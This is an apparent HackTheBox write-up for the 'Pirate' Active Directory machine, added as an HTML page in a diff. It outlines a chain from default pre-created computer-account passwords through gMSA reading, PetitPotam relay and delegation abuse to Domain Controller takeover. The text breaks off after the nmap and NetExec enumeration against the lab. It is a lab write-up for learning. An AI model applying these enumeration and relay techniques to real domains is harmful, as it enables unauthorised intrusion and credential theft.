@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pirate HTB | z1rov</title>
+  <meta name="description" content="Pirate is a Windows Active Directory box built entirely on chained misconfigurations rather than a single CVE. Enumeration reveals two pre-created computer accounts that were never actually joined to the domain, leaving them with a predictable default password — this gets a Kerberos ticket for MS01$, which sits in a non-default group with read access to two gMSA service accounts tied to ADCS/ADFS. Those credentials open a WinRM shell on the Domain Controller, from where a second, internally-isolated host is reached via a Ligolo-ng pivot. That host allows unsigned SMB, enabling a PetitPotam coercion relayed to LDAPS that grants a rogue account constrained delegation, leading to SYSTEM through S4U2Proxy. A leaked Autologon password there exposes a domain user whose existing delegation trust, combined with WriteSPN on the DC's own object, allows an SPN relocation trick that forges an Administrator ticket straight onto the Domain Controller." />
+  <meta name="author"      content="z1rov" />
+  <meta name="robots"      content="index, follow" />
+  <meta name="keywords"    content="oscp, osep, active-directory, windows, hackthebox, pre2k, pre-windows-2000, default-password, kerberos, gmsa, read-gmsa-password, bloodhound, privilege-escalation, lateral-movement, pivoting, ligolo-ng, ntlm-relay, petitpotam, coercion, constrained-delegation, s4u2proxy, spn-abuse, write-spn, credential-exposure, autologon, secretsdump, domain-controller, crte, cape, cpts" />
+  <link rel="canonical"    href="https://www.zirov.net/writeups/pirate-htb.html" />
+  <meta property="og:type"                content="article" />
+  <meta property="og:title"               content="Pirate HTB | z1rov" />
+  <meta property="og:description"         content="Pirate is a Windows Active Directory box built entirely on chained misconfigurations rather than a single CVE. Enumeration reveals two pre-created computer accounts that were never actually joined to the domain, leaving them with a predictable default password — this gets a Kerberos ticket for MS01$, which sits in a non-default group with read access to two gMSA service accounts tied to ADCS/ADFS. Those credentials open a WinRM shell on the Domain Controller, from where a second, internally-isolated host is reached via a Ligolo-ng pivot. That host allows unsigned SMB, enabling a PetitPotam coercion relayed to LDAPS that grants a rogue account constrained delegation, leading to SYSTEM through S4U2Proxy. A leaked Autologon password there exposes a domain user whose existing delegation trust, combined with WriteSPN on the DC's own object, allows an SPN relocation trick that forges an Administrator ticket straight onto the Domain Controller." />
+  <meta property="og:url"                 content="https://www.zirov.net/writeups/pirate-htb.html" />
+  <meta property="og:site_name"           content="z1rov" />
+  <meta property="og:image"              content="https://img.zirov.net/pirate-htb/pirate-htb.png" />
+  <meta property="og:image:width"        content="1200" />
+  <meta property="og:image:height"       content="630" />
+  <meta property="og:image:alt"          content="Pirate HTB — z1rov" />
+  <meta property="og:locale"             content="en_US" />
+  <meta property="article:author"         content="z1rov" />
+  <meta property="article:published_time" content="2026-09-05" />
+  <meta property="article:tag" content="oscp">
+  <meta property="article:tag" content="osep">
+  <meta property="article:tag" content="active-directory">
+  <meta property="article:tag" content="windows">
+  <meta property="article:tag" content="hackthebox">
+  <meta property="article:tag" content="pre2k">
+  <meta property="article:tag" content="pre-windows-2000">
+  <meta property="article:tag" content="default-password">
+  <meta property="article:tag" content="kerberos">
+  <meta property="article:tag" content="gmsa">
+  <meta property="article:tag" content="read-gmsa-password">
+  <meta property="article:tag" content="bloodhound">
+  <meta property="article:tag" content="privilege-escalation">
+  <meta property="article:tag" content="lateral-movement">
+  <meta property="article:tag" content="pivoting">
+  <meta property="article:tag" content="ligolo-ng">
+  <meta property="article:tag" content="ntlm-relay">
+  <meta property="article:tag" content="petitpotam">
+  <meta property="article:tag" content="coercion">
+  <meta property="article:tag" content="constrained-delegation">
+  <meta property="article:tag" content="s4u2proxy">
+  <meta property="article:tag" content="spn-abuse">
+  <meta property="article:tag" content="write-spn">
+  <meta property="article:tag" content="credential-exposure">
+  <meta property="article:tag" content="autologon">
+  <meta property="article:tag" content="secretsdump">
+  <meta property="article:tag" content="domain-controller">
+  <meta property="article:tag" content="crte">
+  <meta property="article:tag" content="cape">
+  <meta property="article:tag" content="cpts">
+  <meta name="twitter:card"        content="summary_large_image" />
+  <meta name="twitter:title"       content="Pirate HTB | z1rov" />
+  <meta name="twitter:description" content="Pirate is a Windows Active Directory box built entirely on chained misconfigurations rather than a single CVE. Enumeration reveals two pre-created computer accounts that were never actually joined to the domain, leaving them with a predictable default password — this gets a Kerberos ticket for MS01$, which sits in a non-default group with read access to two gMSA service accounts tied to ADCS/ADFS. Those credentials open a WinRM shell on the Domain Controller, from where a second, internally-isolated host is reached via a Ligolo-ng pivot. That host allows unsigned SMB, enabling a PetitPotam coercion relayed to LDAPS that grants a rogue account constrained delegation, leading to SYSTEM through S4U2Proxy. A leaked Autologon password there exposes a domain user whose existing delegation trust, combined with WriteSPN on the DC's own object, allows an SPN relocation trick that forges an Administrator ticket straight onto the Domain Controller." />
+  <meta name="twitter:image"       content="https://img.zirov.net/pirate-htb/pirate-htb.png" />
+  <meta name="twitter:image:alt"   content="Pirate HTB — z1rov" />
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Pirate HTB",
+    "description": "Pirate is a Windows Active Directory box built entirely on chained misconfigurations rather than a single CVE. Enumeration reveals two pre-created computer accounts that were never actually joined to the domain, leaving them with a predictable default password — this gets a Kerberos ticket for MS01$, which sits in a non-default group with read access to two gMSA service accounts tied to ADCS/ADFS. Those credentials open a WinRM shell on the Domain Controller, from where a second, internally-isolated host is reached via a Ligolo-ng pivot. That host allows unsigned SMB, enabling a PetitPotam coercion relayed to LDAPS that grants a rogue account constrained delegation, leading to SYSTEM through S4U2Proxy. A leaked Autologon password there exposes a domain user whose existing delegation trust, combined with WriteSPN on the DC's own object, allows an SPN relocation trick that forges an Administrator ticket straight onto the Domain Controller.",
+    "image": "https://img.zirov.net/pirate-htb/pirate-htb.png",
+    "author": {
+      "@type": "Person",
+      "name": "z1rov",
+      "url": "https://www.zirov.net/page/about.html"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "z1rov",
+      "url": "https://www.zirov.net/"
+    },
+    "datePublished": "2026-09-05",
+    "dateModified":  "2026-09-05",
+    "url": "https://www.zirov.net/writeups/pirate-htb.html",
+    "keywords": ["oscp", "osep", "active-directory", "windows", "hackthebox", "pre2k", "pre-windows-2000", "default-password", "kerberos", "gmsa", "read-gmsa-password", "bloodhound", "privilege-escalation", "lateral-movement", "pivoting", "ligolo-ng", "ntlm-relay", "petitpotam", "coercion", "constrained-delegation", "s4u2proxy", "spn-abuse", "write-spn", "credential-exposure", "autologon", "secretsdump", "domain-controller", "crte", "cape", "cpts"],
+    "articleSection": "Writeups",
+    "inLanguage": "en"
+  }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&family=Outfit:wght@400;500;600;700;800&family=Barlow:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/styles.css">
+  <link rel="stylesheet" href="../css/search.css">
+  <link rel="stylesheet" href="../css/post.css">
+  <link rel="stylesheet" href="../css/collapse.css">
+</head>
+<body>
+<header class="topbar">
+  <button class="hamburger" id="hamburgerBtn" aria-label="Open menu" aria-controls="menuPanel" aria-expanded="false">
+    <span class="hamburger-bar"></span>
+    <span class="hamburger-bar"></span>
+    <span class="hamburger-bar"></span>
+  </button>
+  <a class="logo-wrap" href="/">
+    <svg class="logo-icon" viewBox="-0.5 -0.5 262 270" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#c82525" d="M -0.5,-0.5 C 86.8333,-0.5 174.167,-0.5 261.5,-0.5C 261.5,89.5 261.5,179.5 261.5,269.5C 174.167,269.5 86.8333,269.5 -0.5,269.5C -0.5,179.5 -0.5,89.5 -0.5,-0.5 Z"/>
+      <path fill="#f9f8f8" d="M 121.5,149.5 C 120.244,149.461 119.244,149.961 118.5,151C 143.831,151.5 169.164,151.667 194.5,151.5C 194.5,159.167 194.5,166.833 194.5,174.5C 151.167,174.5 107.833,174.5 64.5,174.5C 64.169,166.472 64.5023,158.472 65.5,150.5C 90.1104,140.298 114.777,130.298 139.5,120.5C 140.289,120.217 140.956,119.717 141.5,119C 115.835,118.5 90.1688,118.333 64.5,118.5C 64.5,110.833 64.5,103.167 64.5,95.5C 108.167,95.5 151.833,95.5 195.5,95.5C 195.831,103.528 195.498,111.528 194.5,119.5C 170.143,129.506 145.809,139.506 121.5,149.5 Z"/>
+    </svg>
+    <span class="logo-text">z1ro<em>v</em></span>
+  </a>
+  <div class="topbar-right">
+    <div class="icon-group">
+      <button class="icon-btn search-btn" aria-label="Search" id="search-toggle">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      </button>
+      <button class="icon-btn" id="themeBtn" aria-label="Toggle theme">
+        <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+        <svg class="i-sun"  viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32 1.41 1.41M2 12h2m16 0h2M4.93 19.07l1.41-1.41m11.32-11.32 1.41-1.41"/></svg>
+      </button>
+    </div>
+    <a href="https://discord.gg/4nnsYWjbUk" target="_blank" rel="noopener" class="btn-join">
+      <svg viewBox="0 0 24 24" fill="currentColor" style="width:12px;height:12px;flex-shrink:0"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
+      <span class="btn-join-full">Join Community</span>
+      <span class="btn-join-short">z1sec</span>
+    </a>
+    <a href="../page/about.html" class="avatar">
+      <img src="../img/profile.png" alt="z1rov" onerror="this.style.display='none'">
+    </a>
+  </div>
+</header>
+<div class="menu-panel-overlay" id="menuPanelOverlay"></div>
+<div class="menu-panel" id="menuPanel">
+  <nav class="menu-panel-nav">
+    <a href="../page/archives.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/></svg>
+      <span>Archives</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <a href="../page/notes.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"/></svg>
+      <span>Notes</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <a href="../page/tags.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z"/></svg>
+      <span>Tags</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <a href="../page/projects.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/></svg>
+      <span>Projects</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <a href="../page/about.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
+      <span>About Me</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <button type="button" class="menu-panel-link menu-theme-toggle" id="themeBtnMobile" aria-label="Toggle theme" onclick="document.documentElement.setAttribute('data-theme', document.documentElement.getAttribute('data-theme')==='dark' ? 'light' : 'dark')">
+      <svg class="menu-panel-link-icon i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+      <svg class="menu-panel-link-icon i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32 1.41 1.41M2 12h2m16 0h2M4.93 19.07l1.41-1.41m11.32-11.32 1.41-1.41"/></svg>
+      <span>Theme</span>
+    </button>
+  </nav>
+</div>
+  <main class="layout">
+    <article class="col-featured post-article">
+      <header class="post-header">
+        <div class="post-breadcrumb">
+          <a href="/">Home</a><span class="sep">›</span>
+          <a href="../page/writeups.html">Writeups</a><span class="sep">›</span>
+          <span>Pirate HTB</span>
+        </div>
+        <h1 class="post-title">Pirate HTB</h1>
+        <div class="post-meta">
+          <span class="post-date"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Sep 5, 2026</span>
+          <span class="post-dot">·</span>
+          <span class="post-words"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg><span>5,762 words</span></span>
+          <span class="post-dot">·</span>
+          <span class="post-readtime"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span>29 min</span></span>
+        </div>
+        <div class="post-tags"><a href="../page/tags.html#oscp" class="tag">oscp</a>
+                  <a href="../page/tags.html#osep" class="tag">osep</a>
+                  <a href="../page/tags.html#active-directory" class="tag">active-directory</a>
+                  <a href="../page/tags.html#windows" class="tag">windows</a>
+                  <a href="../page/tags.html#hackthebox" class="tag">hackthebox</a>
+                  <a href="../page/tags.html#pre2k" class="tag">pre2k</a>
+                  <a href="../page/tags.html#pre-windows-2000" class="tag">pre-windows-2000</a>
+                  <a href="../page/tags.html#default-password" class="tag">default-password</a>
+                  <a href="../page/tags.html#kerberos" class="tag">kerberos</a>
+                  <a href="../page/tags.html#gmsa" class="tag">gmsa</a>
+                  <a href="../page/tags.html#read-gmsa-password" class="tag">read-gmsa-password</a>
+                  <a href="../page/tags.html#bloodhound" class="tag">bloodhound</a>
+                  <a href="../page/tags.html#privilege-escalation" class="tag">privilege-escalation</a>
+                  <a href="../page/tags.html#lateral-movement" class="tag">lateral-movement</a>
+                  <a href="../page/tags.html#pivoting" class="tag">pivoting</a>
+                  <a href="../page/tags.html#ligolo-ng" class="tag">ligolo-ng</a>
+                  <a href="../page/tags.html#ntlm-relay" class="tag">ntlm-relay</a>
+                  <a href="../page/tags.html#petitpotam" class="tag">petitpotam</a>
+                  <a href="../page/tags.html#coercion" class="tag">coercion</a>
+                  <a href="../page/tags.html#constrained-delegation" class="tag">constrained-delegation</a>
+                  <a href="../page/tags.html#s4u2proxy" class="tag">s4u2proxy</a>
+                  <a href="../page/tags.html#spn-abuse" class="tag">spn-abuse</a>
+                  <a href="../page/tags.html#write-spn" class="tag">write-spn</a>
+                  <a href="../page/tags.html#credential-exposure" class="tag">credential-exposure</a>
+                  <a href="../page/tags.html#autologon" class="tag">autologon</a>
+                  <a href="../page/tags.html#secretsdump" class="tag">secretsdump</a>
+                  <a href="../page/tags.html#domain-controller" class="tag">domain-controller</a>
+                  <a href="../page/tags.html#crte" class="tag">crte</a>
+                  <a href="../page/tags.html#cape" class="tag">cape</a>
+                  <a href="../page/tags.html#cpts" class="tag">cpts</a></div>
+      </header>
+      <img class="post-cover" src="https://img.zirov.net/pirate-htb/pirate-htb.png" alt="Pirate HTB cover" onerror="this.style.display='none'"/>
+      <div class="post-content">
+<h1>Pirate</h1>
+<h2>Summary</h2>
+<p>Pirate is a Windows Active Directory machine built on chained misconfigurations rather than a patched CVE. Two computer accounts were pre-created in AD but never joined, leaving them with a predictable default password. That password gets a Kerberos ticket for <code>MS01$</code>, an account sitting in a non-default group with read access to two gMSA service accounts tied to ADCS/ADFS. Those credentials open a shell on the Domain Controller, from where a second, internally-isolated host is reached via a Ligolo-ng pivot. That host allows unsigned SMB, which enables a PetitPotam coercion relayed to LDAPS, granting a rogue account constrained delegation and SYSTEM through S4U2Proxy. A leaked Autologon password there exposes a domain user whose existing delegation trust, combined with <code>WriteSPN</code> on the DC's own object, lets a service ticket be redirected onto the Domain Controller as <code>Administrator</code>.</p>
+<p><strong>Attack chain:</strong> pre-created computer accounts have a default password → <code>MS01$</code> TGT via NetExec <code>pre2k</code> → BloodHound shows <code>ReadGMSAPassword</code> → <code>gMSA_ADCS_prod$</code> / <code>gMSA_ADFS_prod$</code> hashes → WinRM shell on <code>DC01</code> → pivot into internal subnet → <code>WEB01</code> allows unsigned SMB → PetitPotam coercion relayed to LDAPS → <code>COSHMPED$</code> gets constrained delegation over <code>WEB01</code> → S4U2Proxy as Administrator → SYSTEM on <code>WEB01</code> → secretsdump leaks <code>a.white</code>'s cleartext password → SPN moved from <code>WEB01</code> to <code>DC01</code>, ticket redirected via <code>a.white</code>'s existing delegation trust → SYSTEM on <code>DC01</code>.</p>
+<h2>Recon</h2>
+<h3>Port scan</h3>
+<p>The DC in this lab is <code>10.129.116.1</code>, the only IP involved. A full TCP scan first, to avoid missing anything on a non-standard port:</p>
+<pre><code class="lang-bash">nmap -p- --open -sS --min-rate 5000 -Pn -n -T4 10.129.116.1 -oX scan.xml
+</code></pre>
+<pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-05 21:54 UTC
+Nmap scan report for 10.129.116.1
+Host is up (0.12s latency).
+Not shown: 65513 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+2179/tcp  open  vmrdp
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49687/tcp open  unknown
+49688/tcp open  unknown
+49691/tcp open  unknown
+49694/tcp open  unknown
+49919/tcp open  unknown
+61087/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds
+</code></pre>
+<p>The port profile already identifies this as a Domain Controller before any version scan is run.</p>
+<h3>Service detection</h3>
+<pre><code class="lang-bash">nmap -p53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389,49666,49693,49694,49696,49697,49922,49946 -sCV 10.129.116.1 -oN info_10.129.116.1
+</code></pre>
+<pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-05 21:55 UTC
+Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 6.25% done; ETC: 21:57 (0:01:30 remaining)
+Nmap scan report for 10.129.116.1 (10.129.116.1)
+Host is up (0.12s latency).
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     domain        Simple DNS Plus
+80/tcp    open     http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-05 21:56:20Z)
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.pirate.htb
+| Not valid before: 2026-09-05T21:43:06
+|_Not valid after:  2027-09-05T21:43:06
+|_ssl-date: 2026-09-05T21:57:50+00:00; +26s from scanner time.
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-05T21:57:50+00:00; +26s from scanner time.
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.pirate.htb
+| Not valid before: 2026-09-05T21:43:06
+|_Not valid after:  2027-09-05T21:43:06
+2179/tcp  open     vmrdp?
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-05T21:57:50+00:00; +26s from scanner time.
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.pirate.htb
+| Not valid before: 2026-09-05T21:43:06
+|_Not valid after:  2027-09-05T21:43:06
+3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.pirate.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.pirate.htb
+| Not valid before: 2026-09-05T21:43:06
+|_Not valid after:  2027-09-05T21:43:06
+|_ssl-date: 2026-09-05T21:57:50+00:00; +26s from scanner time.
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open     mc-nmf        .NET Message Framing
+49666/tcp filtered unknown
+49693/tcp filtered unknown
+49694/tcp open     msrpc         Microsoft Windows RPC
+49696/tcp filtered unknown
+49697/tcp filtered unknown
+49922/tcp filtered unknown
+49946/tcp filtered unknown
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-09-05T21:57:11
+|_  start_date: N/A
+|_clock-skew: mean: 25s, deviation: 0s, median: 25s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.22 seconds
+</code></pre>
+<p>The certificate <code>commonName</code> and LDAP banner confirm the domain <code>pirate.htb</code> and hostname <code>DC01</code>. SMB signing is required here, so direct SMB relay against the DC is not viable — that path opens later, on a different host. The IIS site on port 80 isn't pursued further, since LDAP turns out to be faster.</p>
+<pre><code class="lang-bash">echo '10.129.116.1 pirate.htb DC01.pirate.htb' | sudo tee -a /etc/hosts
+</code></pre>
+<h2>Enumeration</h2>
+<h3>Users and computers</h3>
+<p>Starting from a low-privilege credential (<code>pentest</code>), we enumerate users and computer objects:</p>
+<pre><code class="lang-bash">nxc smb DC01.pirate.htb -u pentest -p 'p3nt3st2025!&amp;' --users
+</code></pre>
+<pre><code>SMB         10.129.116.1    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.129.116.1    445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&amp; 
+SMB         10.129.116.1    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.116.1    445    DC01             Administrator                 2025-06-08 14:32:36 0       Built-in account for administering the computer/domain 
+SMB         10.129.116.1    445    DC01             Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.116.1    445    DC01             krbtgt                        2025-06-08 14:40:29 0       Key Distribution Center Service Account 
+SMB         10.129.116.1    445    DC01             a.white_adm                   2026-01-16 00:36:34 0        
+SMB         10.129.116.1    445    DC01             a.white                       2025-06-08 19:33:01 0        
+SMB         10.129.116.1    445    DC01             pentest                       2025-06-09 13:40:23 0        
+SMB         10.129.116.1    445    DC01             j.sparrow                     2025-06-09 15:08:44 0        
+SMB         10.129.116.1    445    DC01             [*] Enumerated 7 local users: PIRATE
+</code></pre>
+<pre><code class="lang-bash">nxc ldap DC01.pirate.htb -u pentest -p 'p3nt3st2025!&amp;' --computers
+</code></pre>
+<pre><code>LDAP        10.129.116.1    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.116.1    389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&amp; 
+LDAP        10.129.116.1    389    DC01             [*] Total records returned: 6
+LDAP        10.129.116.1    389    DC01             DC01$
+LDAP        10.129.116.1    389    DC01             WEB01$
+LDAP        10.129.116.1    389    DC01             MS01$
+LDAP        10.129.116.1    389    DC01             EXCH01$
+LDAP        10.129.116.1    389    DC01             gMSA_ADCS_prod$
+LDAP        10.129.116.1    389    DC01             gMSA_ADFS_prod$
+</code></pre>
+<p><code>MS01$</code> and <code>EXCH01$</code> don't correspond to any live host on the network — a sign they may have been pre-staged in AD without a real machine ever completing the join.</p>
+<h3>Pre-created computer accounts</h3>
+<p>This is the actual vulnerability the rest of the chain depends on. A computer account that joins the domain normally gets a random 120+ character password assigned by the DC at join time. An account that is only <em>pre-created</em> — staged in advance by an administrator, before the physical machine exists — starts instead with a fixed, predictable password: the account's own name, lowercase, without the trailing <code>$</code>. That default is only ever replaced once the real machine completes its join and rotates it; if the join never happens, the default stays valid.</p>
+<p>NetExec's <code>pre2k</code> module identifies computer accounts that still show this un-joined state and tests the expected default password against each one via Kerberos pre-authentication:</p>
